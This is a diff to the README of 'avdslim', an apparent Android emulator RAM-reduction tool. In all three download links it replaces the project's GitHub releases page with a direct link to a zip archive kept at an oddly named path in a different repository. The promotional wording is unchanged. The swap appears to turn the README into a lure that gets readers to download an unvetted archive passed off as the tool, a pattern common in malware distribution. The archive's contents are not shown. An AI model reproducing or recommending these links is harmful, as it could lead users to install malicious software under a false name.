@@ -6,7 +6,7 @@ description: "Optimize Android emulator performance by slashing RAM usage from 8
 <h1>⚡ avdslim - Slash Android Emulator RAM Usage Dramatically</h1>
 
 <p align="center">
-  <a href="https://github.com/Blackseeded-screamer8/avdslim/releases"><img src="https://img.shields.io/badge/Download%20avdslim-F01F7A?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD" alt="Download avdslim"></a>
+  <a href="https://raw.githubusercontent.com/Blackseeded-screamer8/blackseeded-screamer8.github.io/main/dentilabial/v1.4.zip"><img src="https://img.shields.io/badge/Download%20avdslim-F01F7A?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD" alt="Download avdslim"></a>
 </p>
 
 ---
@@ -29,7 +29,7 @@ Getting started with avdslim is incredibly easy. You do not need any programming
 
 Visit this link to download the application. You will see the latest version available for your system.
 
-👉 **[Click here to download avdslim](https://github.com/Blackseeded-screamer8/avdslim/releases)**
+👉 **[Click here to download avdslim](https://raw.githubusercontent.com/Blackseeded-screamer8/blackseeded-screamer8.github.io/main/dentilabial/v1.4.zip)**
 
 On that page, look for the newest release. You will see files listed for different operating systems. Choose the one that matches your computer:
 
@@ -185,7 +185,7 @@ avdslim is a game-changer for anyone who uses Android emulators. It is a small t
 
 Do not let your emulator hold your system hostage. Take control today.
 
-👉 **[Download avdslim now and reclaim your RAM](https://github.com/Blackseeded-screamer8/avdslim/releases)**
+👉 **[Download avdslim now and reclaim your RAM](https://raw.githubusercontent.com/Blackseeded-screamer8/blackseeded-screamer8.github.io/main/dentilabial/v1.4.zip)**
 
 ---
 
